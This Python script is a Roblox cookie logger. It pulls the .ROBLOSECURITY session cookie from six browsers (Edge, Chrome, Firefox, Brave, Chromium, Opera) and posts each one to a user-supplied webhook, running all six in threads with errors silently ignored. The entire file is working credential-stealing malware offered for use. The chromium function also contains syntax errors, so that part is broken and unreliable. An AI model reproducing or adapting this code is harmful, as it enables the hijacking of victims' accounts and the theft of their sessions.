import browser_cookie3, requests, threading

URL = "" # Put your webhook url here

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
    
def brave_logger():
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass
    
def chromium_logger(): # Not like anyone uses that anyways lol
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split)' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(URL, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, brave_logger, chromium_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()
